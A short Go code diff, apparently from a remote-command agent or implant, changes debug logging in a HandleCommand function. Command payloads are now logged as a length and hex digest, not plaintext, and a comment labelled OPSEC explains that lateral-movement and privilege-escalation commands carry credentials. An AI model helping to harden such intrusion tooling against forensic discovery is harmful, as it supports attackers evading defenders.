@@ -74,7 +74,13 @@ func HandleCommand(data []byte) {
 
 	debuglog.Printf("📝 [命令调试] 接收到命令类型: %d, 数据长度: %d\n", cmdType, len(cmdBuf))
 	if len(cmdBuf) > 0 {
-		debuglog.Printf("📝 [命令数据] 数据内容: %s\n", string(cmdBuf))
+		// 【OPSEC】debug 构建仅打印命令载荷摘要(长度+首 16 字节 hex),不打印明文:
+		// 横向移动/提权类命令携带凭据,debug 构建泄露时明文直出
+		head := len(cmdBuf)
+		if head > 16 {
+			head = 16
+		}
+		debuglog.Printf("📝 [命令数据] 长度=%d, 摘要=%x\n", len(cmdBuf), cmdBuf[:head])
 	}
 
 	// 智能命令频率控制（交互式终端命令需要实时响应，跳过节流）
